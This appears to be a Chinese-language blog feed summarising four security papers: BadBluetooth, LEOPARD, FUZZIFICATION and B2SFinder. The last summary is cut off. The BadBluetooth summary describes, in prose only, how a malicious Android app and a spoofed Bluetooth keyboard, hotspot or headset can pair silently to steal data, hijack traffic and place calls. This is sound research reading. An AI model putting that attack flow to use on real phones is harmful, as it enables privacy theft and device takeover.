    <title>BadBluetooth: Breaking Android Security Mechanisms via Malicious Bluetooth Peripherals(NDSS 2019)</title>
    <url>/93934686.html</url>
    <content><![CDATA[<blockquote><p>本文针对Android 4.2后google开发的蓝牙栈 BlueDroid中存在的粗粒度权限管理问题，提出了并实现了在多版本中的攻击<strong>BadBluetooth</strong>。</p><p>通过将蓝牙设备伪装为键盘，网络接入点和耳机，同时配合Android 恶意app发起静默配对，最终实现控制手机截屏偷取用户隐私数据，劫持通信流量，甚至在锁屏状态下拨打电话等攻击。</p><p>最后，作者在AOSP项目上实现了对应的防御框架</p></blockquote><a id="more"></a><h2><span id="pintroduction">Introduction</span><a href="#pintroduction" class="header-anchor">#</a></h2><p>本文从逻辑层面对蓝牙进行了系统的研究，包括攻击者模型、设备认证、授权、安全策略等底层假设。</p><p>虽然各类OS都存在蓝牙模块，但考虑到Android系统的普及性，所以主要研究了Android系统蓝牙模块存在的问题。</p><p><strong>贡献</strong>：</p><ul><li>发现了几个Android系统在蓝牙设计和实现中的漏洞，包括设备配置文件修改，粗粒度的认证和授权机制等</li><li>通过这些漏洞，能够在真实环境中实现攻击，造成信息泄露等威胁</li><li>实现了针对这一问题的防御框架并进行了效果评估</li></ul><h2><span id="pbackground">BackGround</span><a href="#pbackground" class="header-anchor">#</a></h2><p>背景介绍中主要介绍了蓝牙的相关知识，之前我也没接触过，所以认真看了下</p><h3><span id="pbluetooth-stack">Bluetooth Stack</span><a href="#pbluetooth-stack" class="header-anchor">#</a></h3><p><strong>蓝牙协议栈的结构</strong>如下图：</p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134146.jpg" alt="image-20200519133616474" style="zoom:50%"><p>蓝牙栈是一个多层的结构，包括物理层、链路层、中间件层和应用层。下层由蓝牙芯片实现，包含无线控制器、系带控制器等。它们通过主机控制器接口(Host Controller Interface)与操作系统进行通信，中间件层的协议由操作系统实现。</p><p>中间件层的基础层协议是逻辑链路控制适配协议(L2CAP)，它管理两个蓝牙设备之间的连接，实现了QoS、流控、分片和重装机制等功能。在L2CAP的基础上，设计了一系列面向应用的协议。（RFCOMM,SDP等）</p><h3><span id="pbluetooth-profile">Bluetooth Profile</span><a href="#pbluetooth-profile" class="header-anchor">#</a></h3><p>蓝牙配置文件是为了规范不同厂商设备间的通信。在配置文件中包含了引导通信的设置，例如格式、协议等，目前共有30多种标准配置文件。</p><p>最常用的配置文件是耳机配置文件(Headset Profile，HSP)，它规定了蓝牙耳机如何与手机通信。</p><h3><span id="pbluetooth-connetion">Bluetooth Connetion</span><a href="#pbluetooth-connetion" class="header-anchor">#</a></h3><p><strong>蓝牙的连接过程</strong>：</p><ul><li><strong>发现阶段</strong>：扫描发现附近设备，包括设备名字，设备种类，设备profile</li><li><strong>配对阶段</strong>：致辞多种配对模式，一般需要用户输入pin码或者比较数据</li><li><strong>建立连接</strong>：两个设备配对后共享link key，用于加密双方通信的数据</li></ul><h3><span id="pandroid-bluetooth">Android Bluetooth</span><a href="#pandroid-bluetooth" class="header-anchor">#</a></h3><p>之前的Android的是linux的BlueZ栈，但从Android 4.2开始，google实现了自己的蓝牙栈BlueDroid</p><p><strong>BlueDroid中的权限管理</strong>：</p><ul><li>normal-level：无需用户确认，用来请求和接收连接<ul><li>BLUETOOTH</li><li>BLUETOOTH_ADMIN</li></ul></li><li>dangerous-level，：需要用户授权，扫描附近设备，用来获取用户位置<ul><li>ACCESS_COARSE_LOCATION</li><li>ACCESS_FINE_LOCATION</li></ul></li><li>signature-level：需要用户授权，用户需要交互的配对过程<ul><li>BLUETOOTH_PRIVILEGED</li></ul></li></ul><h2><span id="pdesign-weaknesses">Design Weaknesses</span><a href="#pdesign-weaknesses" class="header-anchor">#</a></h2><p>在BlueDroid的设计中，主要存在以下<strong>五个weakness</strong></p><ul><li><p><strong>Weakness #1: Inconsistent Authentication Process on Pro- files.</strong></p><ul><li><p>在配对过程中，配置文件不会被列出。如果在配对后对配置文件进行修改，配对仍然会成立</p></li><li><p>如果连接时为耳机的配置文件，在连接后修改为输入设备的配置文件，那么就能够通过蓝牙进行输入了</p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134154.jpg" alt="image-20200519143519758" style="zoom:67%"></li></ul></li><li><p><strong>Weakness #2: Overly Openness to Profile Connection.</strong></p><ul><li>一旦连接建立，主机就会尽力连接到远程设备声称的所有配置文件，而不会向用户解释风险，也不会让用户审核这些连接。即使用户稍后可以在设备详情菜单中断开某些配置文件的连接，但主机不会记住这样的决定。当下次设备配对时，连接将被重新建立。</li></ul></li><li><p><strong>Weakness #3: Deceivable and Vague UI.</strong></p><ul><li>用户浏览配对的蓝牙设备列表时，能够看到名称和图标，但这是能够伪造的</li><li>恶意设备能够修改名称，通过改变CoD(Class of Device)号改变现实的图标</li><li>缺少UI提示蓝牙相关信息。例如，只有两个事件会在通知栏中提示：显示蓝牙已打开，显示已连接远程设备。</li></ul></li><li><p><strong>Weakness #4: Silent Pairing with Device.</strong></p><ul><li>当从设备端发送配对请求时，Android系统会弹出对话框让用户确认。但是，如果由手机发起连接，则可能没有通知。 比如，当设备没有显示能力或输入能力（例如，耳机）</li></ul></li><li><p>**Weakness #5: No Permission Management for Profile. **</p><ul><li>Android通过权限限制应用程序是否可以访问蓝牙设备，但是权限管理太过粗糙</li><li>例如使用BLUETOOTH_ADMIN权限能访问配置文件，虽然在新版中受到了限制，但能通过java反射机制实现</li></ul></li></ul><h2><span id="pattack-overview">ATTACK OVERVIEW</span><a href="#pattack-overview" class="header-anchor">#</a></h2><p><strong>攻击者模型</strong>：</p><ul><li>手机上安装具有Bluetooth权限的恶意app-BLUETOOTH和BLUETOOTH_ADMIN是一般权限 - 无需请求用户同意权限申请</li><li>Bluetooth设备是受攻击者控制的 - XcodeGhost攻击 - 通过设备其他漏洞获得设备权限后插入恶意代码</li></ul><p><strong>攻击流程</strong>：</p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134202.jpg" alt="image-20200519144807796" style="zoom:67%"><ul><li><strong>修改配置文件(#1 #2 #3)</strong>：配对完成后，设备添加其他配置文件，并在攻击完成后删除</li><li><strong>静默连接(#4)</strong>：使用静默方式连接恶意蓝牙设备</li><li><strong>使用敏感的配置文件(#5)</strong>：通过java反射机制操作敏感的配置文件</li></ul><p><strong>攻击步骤</strong>：</p><ul><li>启动恶意app，并保持后台运行，直到监测到手机屏幕关闭时开始攻击</li><li>通过调用BluetoothAdapter.enable静默配对已知地址的恶意设备</li><li>设备等待从app发来的命令，命令通过蓝牙信道传送，或通过网络转发</li><li>接到命令后，设备使用敏感的配置文件，App利用存在的配置文件功能</li><li>设备恢复正常的状态，App使用removeBond取消配对，以免引起注意</li></ul><h2><span id="pattack">Attack</span><a href="#pattack" class="header-anchor">#</a></h2><p>作者根据现有的android profile，总结并实现了攻击，其中HID、PAN和HFP/HSP这三个profile可以被攻击者利用</p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134207.jpg" alt="image-20200519145350562" style="zoom:67%"><h3><span id="phip-human-interface-device">HIP(Human Interface Device)</span><a href="#phip-human-interface-device" class="header-anchor">#</a></h3><p>例如键盘和鼠标，当HIP接入后，就能向android手机输入内容了</p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134212.jpg" alt="image-20200519151056154" style="zoom:50%"><p><strong>攻击策略</strong>：</p><ul><li>自适应攻击：主要在于识别鼠标位置等，通过手机手机的信息</li><li>输入：通过模拟按键和鼠标点击构造输入</li><li>输出：截屏或者选择文字赋值粘贴进行输出</li></ul><p><strong>危害</strong>：</p><ul><li>信息窃取</li><li>操控系统和App</li><li>盗取密码等敏感内容</li></ul><h3><span id="ppan-persinal-area-networking">PAN(Persinal Area Networking)</span><a href="#ppan-persinal-area-networking" class="header-anchor">#</a></h3><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134216.jpg" alt="image-20200519151935464" style="zoom:67%"><p><strong>危害</strong>：</p><ul><li>网络嗅探和欺骗：由于手机能够通过蓝牙访问互联网，因此可以执行中间人攻击，拦截流量</li><li>偷网络流量：通过蓝牙共享手机网络</li></ul><h3><span id="phf-hands-free">HF(Hands Free)</span><a href="#phf-hands-free" class="header-anchor">#</a></h3><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134221.jpg" alt="image-20200519153546573" style="zoom:67%"><p><strong>危害</strong>：</p><ul><li>控制电话，拨打任意号码</li><li>语音命令控制</li></ul><h3><span id="pother-profiles">Other Profiles</span><a href="#pother-profiles" class="header-anchor">#</a></h3><p>除了上述三种profile的攻击，也有一些其他的攻击可以实现，但他们会通知用户批准请求，因此并不隐秘</p><h2><span id="pimplementations-and-evaluations">IMPLEMENTATIONS AND EVALUATIONS</span><a href="#pimplementations-and-evaluations" class="header-anchor">#</a></h2><p>设备：</p><ul><li>树莓派2代（Linux OS）</li><li>CSR8510 USB蓝牙适配器</li><li>Google Pixel 2 （Android 8.1）</li></ul><p>实现：</p><p>Raspberry Pi 2 + 1100 行Python 代码（PyBluez）</p><ul><li>HID attack，raw L2CAP</li><li>PAN attack，tcpdump和dnsmasq</li><li>HFP attack，pulseaudio和ofono</li></ul><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134226.jpg" alt="image-20200519153858880" style="zoom:50%"><p>在测试中，Android5.0到8.1之间的测试版本都攻击成功了</p><h2><span id="pprofile-binding-for-android">PROFILE BINDING FOR ANDROID</span><a href="#pprofile-binding-for-android" class="header-anchor">#</a></h2><p>为了解决发现的问题，作者也提出并实现了相应的防御框架，对profile进行控制</p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134238.jpg" alt="image-20200519154141699" style="zoom:50%"><p>经过检验，这个上层防御框架能够在比正常使用多12%的时间，实现很好的防御</p><h2><span id="pge-ren-gan-jue">个人感觉</span><a href="#pge-ren-gan-jue" class="header-anchor">#</a></h2><p>文中主要对安卓蓝牙协议栈进行了研究，但其实文中提出的weakness中，有的在其他系统中也存在，比如静默匹配，以及提示弹窗问题在大部分系统中都有，可能可以对这一方法进行一些系统的扩展和进一步研究。</p><p>同时，由于蓝牙是基于连接的问题，可以想到常用的wifi，苹果的隔空投送等也可能有问题。</p><p>例如，刚看论文的时候想到了一个wifi重连的问题，虽然没仔细研究，但可能可以根据wifi自动重连的机制，伪造wifi，截取用户的流量，形成中间人攻击</p>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>mobile_security</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>mobile security</tag>
      </tags>
  </entry>
  <entry>
    <title>LEOPARD: Identifying Vulnerable Code for Vulnerability Assessment through Program Metrics(ICSE 2019)</title>
    <url>/eda43453.html</url>
    <content><![CDATA[<blockquote><p>识别代码中的脆弱点漏洞评估的重要步骤，当前主要的两种方法为：基于度量和基于模式。前者基于机器学习，后者依赖先验知识。本文提出并实现了一个通用、轻量且具有可扩展性的基于程序指标识别漏洞函数的框架 <strong>LEOPARD</strong>，这个框架不需要任何漏洞的先验知识就能识别脆弱点。第一步，通过复杂的程序指标将目标应用的函数分类；第二步，对每个分类中的函数进行排序，并将排位靠前的函数作为漏洞函数。在实际应用中，LEOPARD将20%的函数中识别出了74%的漏洞函数，从PHP，r2等应用中找到了22个新bug，其中8个是新漏洞。</p></blockquote><a id="more"></a><h2><span id="pintroduction">Introduction</span><a href="#pintroduction" class="header-anchor">#</a></h2><p><strong>两种方法</strong>：</p><ul><li><strong>Metric-based</strong>:<ul><li>使用监督学习或无监督学习，在文件粒度级别预测漏洞</li><li>缺点：复杂度过高，需要采用复杂的特征，例如词频，依赖关系等</li></ul></li><li><strong>Pattern-based</strong>：<ul><li>Pattern来自于语法或语义抽象，基于先验知识</li><li>检测特定类型的漏洞，例如missing check等</li></ul></li></ul><p><strong>存在的问题</strong>:都基于先验知识，复杂度太高等</p><p><strong>LEOPARD</strong>：</p><ul><li>用于漏洞评估，而不是指出漏洞在哪里（？？？我感觉挺扯淡的这个东西）</li><li>不需要先验知识，使用complexity metrics和vulnerability metrics</li><li>complexity metrics：关注函数复杂性（循环复杂性和循环结构）</li><li>vulnerability metrics：关注函数依赖、指针使用，控制结构的依赖关系</li></ul><p><strong>分为两步</strong>：</p><ul><li>第一步：使用complexity metrics将函数分为多类</li><li>第二步：使用vulnerability metrics对每一类中的函数进行排序，靠前者为可能的漏洞函数</li></ul><h2><span id="pmethodolody">Methodolody</span><a href="#pmethodolody" class="header-anchor">#</a></h2><p>整体框架如下图：</p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133800.jpg" alt="image-20200518200240039" style="zoom:50%"><h3><span id="pfunction-binning">Function Binning</span><a href="#pfunction-binning" class="header-anchor">#</a></h3><p>不同的漏洞通常具有不同的复杂程度。为了识别各种复杂程度的漏洞，首先将目标应用程序中的所有函数基于复杂度分为多个种类。每个种类代表不同的复杂程度，供后面的Function Ranking来做预测。这种分级和排序方法旨在避免遗漏低复杂性的易受攻击的功能。</p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133815.jpg" alt="image-20200518200528822" style="zoom:50%"><p>两类特征：</p><ul><li><p>CD1：主要考虑函数中的路径数目</p></li><li><p>CD2：主要考虑循环结构的特征，包括循环数、嵌套循环数和循环的最大嵌套级别。</p></li></ul><h3><span id="pfunction-ranking">Function Ranking</span><a href="#pfunction-ranking" class="header-anchor">#</a></h3><p>根据漏洞的一般特征推导出一组新的漏洞度量，然后对每类中的函数基于度量进行排序，将最上层函数识别为易受攻击的函数。</p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133820.jpg" alt="image-20200518200832194" style="zoom:50%"><p>主要选用选用了三类特征：</p><ul><li>依赖度量：包括函数参数已经caller和callee之间的依赖</li><li>指针度量：指针算数运算的数量、指针运算中涉及到的变量数目等</li><li>控制流结构度量：最大控制流依赖等</li></ul><h2><span id="papplications-of-leopard">Applications of LEOPARD</span><a href="#papplications-of-leopard" class="header-anchor">#</a></h2><p>由于之前说过LEOPARD不是直接检测漏洞，只是用来预测哪部分很可能出现漏洞，因此这里讲的是对LEPPARD的应用。</p><p>主要是拿LEOPARD的结果去fuzzing，然后发现了22个bug，其中8个是漏洞。</p><h2><span id="pevalutaion">Evalutaion</span><a href="#pevalutaion" class="header-anchor">#</a></h2><p>主要针对以下五个问题进行评估</p><ul><li><p>Q1. Is the binning step before the ranking step reasonable?</p></li><li><p>Q2. Is our binning-and-ranking approach effective, and can it outperform baseline approaches, machine learning-based techniques and some off-the-shelf static scanners?</p></li><li><p>Q3. What is the sensitivity of the metrics to the effectiveness of our framework?</p></li><li><p>Q4. What is the performance overhead (i.e., scalability) of our framework?</p></li><li><p>Q5. What are the potential application scenarios of LEOP- ARD?</p></li></ul><p><strong>Q1</strong>：</p><p>通过在现有的ground truth中使用度量计算分数，可以看到其中确实存在着关系</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133831.jpg" alt="image-20200518210146452"></p><p><strong>Q2</strong>：</p><p>通过和现有的方法对比，主要评估相同百分比的源代码中找到的漏洞占比</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133836.jpg" alt="image-20200518210401103"></p><p><strong>Q3</strong>: 通过在原来的度量上去掉某度量和不去掉时的效果进行比较，结论为，去掉后的效果都不如去掉前，每个度量比较敏感，所以总体度量的选择是比较合适的</p><p><strong>Q4</strong>：经过在大项目中的评测，可以适用于大规模处理</p><p><strong>Q5</strong>：主要应用前景还是在进一步的fuzz中，LEOPARD的结果对灰盒fuzz帮助较大</p><h2><span id="pge-ren-gan-jue">个人感觉</span><a href="#pge-ren-gan-jue" class="header-anchor">#</a></h2><p>总体来说，启发式的方法对于分析人员还是很有好处的，分析人员能重点关注启发式的结果，在同样的投入下得到更高的审计产出。</p><p>之前关注的都是直接找漏洞的研究，但确实都需要先验的知识，例如基于0day的patch找1day等。文中方法虽然也是有先验的信息，但不需要大量的数据收集和训练等步骤，可以说是一种通用的启发式方法。</p><p>整体感觉上，是阐述了 越复杂的函数越容易出漏洞的 简明道理。</p>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>automatic_analyse</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>automatic analyse</tag>
      </tags>
  </entry>
  <entry>
    <title>FUZZIFICATION: Anti-Fuzzing Techniques(USENIX 2019)</title>
    <url>/14b4d99.html</url>
    <content><![CDATA[<blockquote><p>fuzz作为一种自动化技术，在安全人员手中能够用来发现漏洞，但同时也让hacker能够通过fuzz寻找0day进行攻击。</p><p>为了解决这个问题，本文提出了FUZZIFICATION技术。在实际应用中，对外发布使用FUZZIFICATION处理过的二进制文件，提高hacker fuzz的难度和成本，而对内，由于安全人员拥有未处理过的二进制，使得安全人员能够在hacker fuzz出漏洞前更早的发现漏洞并进行修补。</p></blockquote><a id="more"></a><h2><span id="pintroduction">Introduction</span><a href="#pintroduction" class="header-anchor">#</a></h2><p>anti-fuzzing的目的类似于二进制中的混淆技术，为了提高攻击者的攻击难度。攻击者虽然能够对FUZZIFICATION处理后的二进制文件进行fuzz，但需要耗费更多的经历(内存、算力、时间等)。而安全人员能够利用这个时间差在攻击者之前寻找漏洞并进行修补。</p><p>有效的anti-fuzzing技术应该满足以下<strong>三个条件</strong>：</p><ul><li>能够有效阻止现有的fuzz工具，在固定时间内发现更少的错误</li><li>受保护的程序在正常状态下仍然能够正常运行</li><li>保护技术不应该被轻易识别并通过patch从程序中删除</li></ul><p>现有的技术无法同时满足这三个目标：</p><ul><li><strong>software obfuscation techniques</strong>：通过混淆阻止fuzz存在以下问题<ul><li>混淆给正常执行带来很大的开销，例如ollvm混淆使执行速度降低了约25倍</li><li>混淆只能减慢单次fuzz的速度，但无法在路径上做文章</li></ul></li><li><strong>software diversification</strong>：软件多样化能缓解攻击但无法隐藏根本漏洞</li></ul><p>本文提出了三种FUZZIFICATION 技术，保护程序抵抗fuzz，分别是SpeedBump（注入delay），BrachTrap（插入jump）和AntiHybrid（阻止其他技术在fuzzing领域的应用），并实现了这三种防御机制。</p><p>为了评估FUZZIFICATION技术，作者在LAVA-M数据集和9个常用程序上做了实验，使用4个流行fuzzer（AFL、HonggFuzz、VUzzer和QSym）对受保护和未保护程序进行实验。</p><p><strong>贡献：</strong></p><ul><li>阐明了<strong>anti-fuzzing方案的新研究方向</strong>。</li><li>提出并实现了<strong>三种有效的FUZZIFICATION方法</strong>。降低fuzzing速度，隐藏路径覆盖范围、阻止动态污点分析和符号执行。</li><li><strong>使用流行的fuzzer和通用基准进行评估</strong>。从真实二进制文件中发现的bug减少了93％，从LAVA-M数据集中发现的bug减少了67.5％，在保持用户指定的开销预算的同时，覆盖率也降低了70.3％。且数据流和控制流分析技术无法轻易移除FUZZIFICATION技术。 源代码：<a href="https://github.com/sslab-gatech/fuzzification" target="_blank" rel="noopener">https://github.com/sslab-gatech/fuzzification</a></li></ul><h2><span id="pbackground-and-problem">Background and Problem</span><a href="#pbackground-and-problem" class="header-anchor">#</a></h2><h3><span id="pfuzzing-techniques">Fuzzing techniques</span><a href="#pfuzzing-techniques" class="header-anchor">#</a></h3><p>为了在fuzz的时候速度更快，一般会从加速单次执行的速度或者减少执行的次数考虑</p><ul><li>单次执行加速：定制的硬件、并行fuzzing</li><li>覆盖率：收集每次执行的代码覆盖率，并优先fuzz触发新分支的输入。一般采用基本块或者分支来统计代码覆盖率</li><li>启发式：使用污点分析等方法帮助fuzz</li></ul><h3><span id="pfuzzification-problem">FUZZIFICATION Problem</span><a href="#pfuzzification-problem" class="header-anchor">#</a></h3><p><strong>问题场景：</strong></p><p>程序开发人员希望由自己或者受信方公开漏洞，而不是黑客，而Anti-Fuzzing技术能够阻碍恶意人员的fuzzing，实现这一目标</p><p><strong>FUZZIFICATION流程：</strong></p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134022.jpg" alt="image-20200517212520008" style="zoom:50%"><ol><li>对外公开使用FUZZIFICATION技术编译生成受保护的二进制文件</li><li>对内使用常规方法编译生成正常的二进制文件</li><li>通过两者fuzz的差距，完成目标</li></ol><p><strong>攻击方设定：</strong></p><ul><li>有限的资源</li><li>只有受FUZZIFICATION保护的二进制文件</li></ul><p><strong>FUZZIFICATION技术目标：</strong></p><ul><li>**Effective：**与原始二进制相比，能够在同样的资源条件下，有效减少发现的bug数量</li><li>**Generic：**对大多数fuzzer适用</li><li>**Efficient：**对常规适用影响小</li><li>**Robust：**能够抵抗试图从二进制文件中删除保护的方法</li></ul><p>下列已有的方法都无法同时满足这四个要求</p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134027.jpg" alt="image-20200517213140563" style="zoom:50%"><h3><span id="pdesign-overview">Design Overview</span><a href="#pdesign-overview" class="header-anchor">#</a></h3><p>针对上述分析，本文提出了<strong>三种FUZZIFICATION技术：</strong></p><ul><li>**SpeedBump：**在二进制中插入延迟原语，在fuzz时会频繁使用，而正常时不怎么使用</li><li>**BranchTrap：**构造对输入敏感的分支，使得基于覆盖率的fuzzer多走弯路，同时有意使得频繁路径冲突，从而达到让fuzzer无法识别触发新路径的输入</li><li>**AntiHybird：**将显式数据流转换为隐式数据流，防止通过污点分析进行数据流跟踪，插入大量伪造符号在符号执行过程中触发路径爆炸</li></ul><h2><span id="pspeedbump">SpeedBump</span><a href="#pspeedbump" class="header-anchor">#</a></h2><p>**原理：**fuzzer在进行fuzz的时候，会进入类如错误处理的路径，而在正常使用时这些路径并不会经常被执行。所以在这些cold path中注入延迟原语，可以大大降低fuzz执行的速度，且不会对正常执行产生大影响。</p><p><strong>方法：</strong></p><ul><li>正常编译二进制文件，对二进制文件进行测试，找到cold path<ul><li>通过生成基本块的频率曲线，识别cold path</li></ul></li><li>确认注入延迟的cold path数目和延迟大小，使正常执行时开销在预算之内<ul><li>重复操作，调整延迟大小</li></ul></li></ul><p>如果简单的注入sleep等语句，那么可以十分方便的进行去除，所以作者设计了基于CSmith的原语，使用算数运算并和原始代码关联</p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134032.jpg" alt="image-20200517225729039" style="zoom:50%"><h2><span id="pbranchtrap">BranchTrap</span><a href="#pbranchtrap" class="header-anchor">#</a></h2><p>**原理：**对于使用覆盖率的fuzzer，通过插入大量对输入敏感的分支，使得fuzzer陷入对这些分支的分析中，误导fuzzer</p><p>构造大量条件分支和间接跳转，这些条件分支与输入的字节相关，因此对输入敏感。</p><p>为了使fuzzer关注假分支，作者考虑了以下四个方面</p><ul><li>假分支足够多</li><li>注入的分支和路径对常规运行带来的开销影响小</li><li>路径需要与输入相关</li><li>无法被攻击者轻易去除</li></ul><p><strong>方法：</strong></p><ul><li><strong>CFG Distortion：</strong> 注入跳转表，使用输入作为索引，并且使用类似于ROP的方法，使用gadget<ul><li>优点1：与输入相关联，所以fuzzer不会忽略这些分支</li><li>优点2：轻量级的解析跳转对正常情况下影响小</li><li>优点3：基于ROP方法，增加了去除的难度</li></ul></li><li>**Saturating Fuzzing State：**使fuzzing状态饱和，在很少访问的分支中加入大量确定性分支</li></ul><h2><span id="pantihybird">AntiHybird</span><a href="#pantihybird" class="header-anchor">#</a></h2><p><strong>原理：</strong> 模糊测试的弱点</p><ul><li>符号执行和污点分析需要大量资源</li><li>符号执行容易受到路径爆炸的问题</li><li>污点分析难以跟踪隐式的数据依赖</li></ul><p><strong>方法：</strong></p><ul><li><p>将显示数据流转换为隐式数据流，对抗污点分析</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134037.jpg" alt="image-20200517231001187"></p></li><li><p>注入多个代码块，有意触发路径爆炸，对抗符号执行</p></li></ul><h2><span id="pevaluation">Evaluation</span><a href="#pevaluation" class="header-anchor">#</a></h2><p>都在论文里，效果可以说是十分不错</p><h2><span id="pge-ren-kan-fa">个人看法</span><a href="#pge-ren-kan-fa" class="header-anchor">#</a></h2><p>论文中提出的三种方法都是针对于当前fuzzer的策略和原理一一提出的方案，短时间内应该很难有更好更全面的的Idea产生了，被UNSNIX接收也是实至名归。</p><p>可以说<code>FUZZIFICATION</code>打开了一个新的研究领域。同时对比于二进制中的混淆和反混淆，可以预见到：如果<code>FUZZIFICATION</code>持续受到研究人员关注的话，那么<code>DE FUZZIFICATION</code> 也会成为研究或者实践中的热点问题之一。</p><p>例如可以想策略去除FUZZFICATION的设置，或者在fuzzer中加入新的启发式策略，从而减少FUZZIFICATION对fuzzer的影响。</p>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>fuzz</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>B2SFinder——Detecting Open-Source Software Reuse in COTS Software(ASE 2019)</title>
    <url>/157adce2.html</url>
    <content><![CDATA[<h2><span id="pb2sfinder-detecting-open-source-software-reuse-in-cots-software">B2SFinder: Detecting Open-Source Software Reuse in COTS Software</span><a href="#pb2sfinder-detecting-open-source-software-reuse-in-cots-software" class="header-anchor">#</a></h2><blockquote><p>B2SFinder 主要是为了解决闭源二进制软件中对复用开源组件检测的问题，由于复用了开源组件，当开源组件发现存在漏洞时，复用它的二进制软件也会存在漏洞，即OSS复用漏洞。</p><p>PS：我挂了个n作</p></blockquote><h2><span id="pabstract">Abstract</span><a href="#pabstract" class="header-anchor">#</a></h2><p>虽然此前也有一些工作致力于研究二进制和源代码的匹配方法，并能进行大规模的分析，但他们只支持一些简单的特征。在他们的研究中只能近似的衡量OSS复用，忽略了项目中的代码结构。</p><p>为了解决这个问题，B2SFinder通过对二进制文件和源代码中的7种特征进行提取，并对7种特征使用三种匹配方法和两种重要性加权方法，计算匹配分数。通过这种方法，我们对1000个流行的二进制软件中的21991个二进制文件和2189个开源库的复用进行了评估。平均每个二进制文件耗时53.85秒。我们也讨论了如何使用B2SFinder检测OSS复用漏洞。</p><a id="more"></a><h2><span id="pintroduction">Introduction</span><a href="#pintroduction" class="header-anchor">#</a></h2><p>对于OSS复用检测，一般来说可以分为两种方法：</p><ol><li>软件二进制 v.s. 开源组件二进制</li><li>软件二进制 v.s. 开源组件源码</li></ol><p>对于第一种方法，主要存在以下两个问题：</p><ol><li>从搜集到的2189个开源库中发现，只有1/4左右能自动编译</li><li>二进制相似性匹配效率低，难以规模化</li></ol><p>对于第二种方法，此前也已有一些研究见下表</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133609.jpg" alt="image-20200510210806748"></p><p>因此，我们能够提出以下问题：</p><ol><li>选取哪些特征，且能对抗编译优化？</li><li>如何精确计算特征之间的相似性？</li><li>我们如何利用开源软件的代码结构来提高复用识别能力？</li></ol><p>B2SFinder的<strong>工作流</strong>如下：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133616.jpg" alt="image-20200510211509018"></p><p>整体上的<strong>特征分类以及算法</strong>如下：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133623.jpg" alt="image-20200510213142174"></p><p>同时，我们也将复用分为以下三类：单一复用、部分复用和嵌套复用，其中前两类是真正的复用。</p><p><strong>实验结果：</strong></p><p>1000个闭源软件中的21991个二进制文件 v.s. 2189个开源库</p><p>达到了92.3%的检测精度以及88.5%的召回率，并且速度更快</p><p>在结果中发现63.4%的闭源软件复用了开源库，并且4.6%的开源库被复用了十次以上，平均每个库存在54.7个已知CVE。</p><h2><span id="pmotivation">Motivation</span><a href="#pmotivation" class="header-anchor">#</a></h2><p>以两个真实例子为例：</p><ul><li>Foxit Reader和ssleay32.dll复用openssl</li><li>Libopenjp2-7.dll复用OpenJPEG</li></ul><h3><span id="pmatching-score-calculation">Matching Score Calculation</span><a href="#pmatching-score-calculation" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133631.jpg" alt="image-20200510214549545"></p><p>从上图中可以看到，FoxitReader.exe和Openssl的export部分没有共同的函数名，并且只有19.7%的字符串常量为共有字符串。因此我们能够知道BAT和OSSPolice这两种方法在这一例子中效果是不理想的。但是我们能够在data段和rdata段以及text段找到一些其他的特征能够匹配上，最终，我们为B2SFinder选取了图中的7种特征。</p><p>有了特征，那么二进制和源码特征之间的特征匹配就是一个新的问题，特别是一些特征在编译的时候，会被轻微的修改</p><p>对于七种特征，我们共使用了3种特征匹配算法</p><ul><li>字符串型（导出函数、字符串数组和导出函数）：使用字符串之间的精确匹配并使用倒排索引方式检索。</li><li>数字数组型（全局常量数组、全局枚举数组）：使用二进制片段检索的匹配</li><li>控制流型（if else、switch case）:基于语义等价的匹配</li></ul><p>注意匹配算法并不等同于匹配分数计算，对此，我们使用了两种分数计算方法</p><ul><li>二进制信息熵</li><li>TF-IDF</li></ul><h3><span id="preuse-type-identification">Reuse Type Identification</span><a href="#preuse-type-identification" 